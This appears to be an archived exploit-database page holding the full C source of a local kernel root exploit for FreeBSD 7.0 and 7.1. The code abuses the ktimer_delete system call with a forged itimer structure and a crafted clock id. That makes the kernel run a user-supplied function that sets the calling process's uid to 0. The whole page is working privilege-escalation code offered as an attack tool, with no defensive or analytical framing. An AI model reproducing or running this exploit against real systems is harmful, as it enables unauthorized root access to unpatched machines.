<html><head><title>FreeBSD 7.0/7.1 (ktimer) Local Kernel Root Exploit</title></head><pre>/* bsd-ktimer.c
 *
 * Copyright (c) 2008 by &lt;christer@signedness.org&gt;
 *                       &lt;mu-b@digit-labs.org&gt;
 *
 * FreeBSD &gt;= 7.0 local kernel root exploit
 * by christer/mu-b - Mon 2 June 2008
 *
 * - Tested on: FreeBSD 7.0
 *              FreeBSD 7.1
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!
 */

#define _KERNEL

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/queue.h&gt;
#include &lt;sys/signalvar.h&gt;
#include &lt;sys/_lock.h&gt;
#include &lt;sys/_mutex.h&gt;
#include &lt;altq/altq.h&gt;
#include &lt;sys/timers.h&gt;

#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/linker.h&gt;
#include &lt;sys/proc.h&gt;

#define ITPSIZE     0x08000000
#define LOOKUP      0xD0000000

/* some prototypes to prevent compiler bitching */
int ktimer_create(int, int, int *);
int ktimer_delete(int);
int kldsym(int, int, void *);

static void
give_me_root()
{
	struct thread *thread;
	asm(&quot;movl %%fs:0,%0&quot;: &quot;=r&quot;(thread));
	thread-&gt;td_proc-&gt;p_ucred-&gt;cr_uid=0;
}

int
main (int argc, char **argv)
{
  struct itimer **itp_page, *it_page;
  struct kld_sym_lookup ksym;
  void *zpage[16];
  int i, r;

  printf (&quot;FreeBSD local kernel root exploit\n&quot;
          &quot;by: christer/mu-b\n&quot;
          &quot;http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!\n\n&quot;);

  itp_page = mmap (0, ITPSIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (itp_page &lt; 0)
    {
      fprintf (stderr, &quot;%s: failed to mmap %d-bytes\n&quot;,
                       argv[0], ITPSIZE);
      exit (EXIT_FAILURE);
    }

  printf (&quot;* allocated pointer page: 0x%08X -&gt; 0x%08X [%d-bytes]\n&quot;,
          (int) itp_page, (int) itp_page + ITPSIZE, ITPSIZE);

  it_page = mmap (itp_page + ITPSIZE, sizeof (struct itimer),
                  PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (it_page &lt; 0)
    {
      fprintf (stderr, &quot;%s: failed to mmap %d-bytes\n&quot;,
                       argv[0], sizeof (struct itimer));
      exit (EXIT_FAILURE);
    }

  printf (&quot;* allocated itimer struct: 0x%08X -&gt; 0x%08X [%d-bytes]\n&quot;,
          (int) it_page, (int) it_page + sizeof (struct itimer), sizeof (struct itimer));

  printf (&quot;* filling pointer page... &quot;);
  fflush (stdout);

  for (i = 0; i &lt; ITPSIZE / sizeof (struct itimer *); i++)
    itp_page[i] = it_page;
  printf (&quot;done\n&quot;);

  ksym.version = sizeof(ksym);
  ksym.symname = &quot;posix_clocks&quot;;

  if (kldsym(0,KLDSYM_LOOKUP,&amp;ksym) &lt; 0)
    {
      fprintf (stderr, &quot;%s: failed to lookup posix_clocks\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  printf(&quot;* found posix_clocks @ [0x%x]\n&quot;,(unsigned )ksym.symvalue);

  for (i = 0; i &lt; 16; i++)
    zpage[i] = (void *) give_me_root;

  memset (it_page,  0, sizeof (struct itimer));
  /* DIRTY REPLACE WITH EXACT STRUCTURE MEMBER */
  for (i = 0; i &lt; 10; i++)
    ((unsigned int *) it_page)[i] = 4;

  it_page-&gt;it_flags = 0x00;
  it_page-&gt;it_usecount = 0;
  it_page-&gt;it_clockid = ((int) &amp;zpage[8] - ksym.symvalue) / 20;

  printf (&quot;* it_page-&gt;it_clockid: 0x%08X [access @0x%08X]\n&quot;,
           it_page-&gt;it_clockid,(unsigned )&amp;zpage[8]);
  printf (&quot;* ktimer_delete (0x%08X)\n&quot;, LOOKUP);

  sleep (2);
  ktimer_create (0, 0, &amp;i);
  r = ktimer_delete (LOOKUP);

  printf (&quot;* ktimer_delete: %d %d\n&quot;, r, it_page-&gt;it_flags);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-03-23]</pre></html>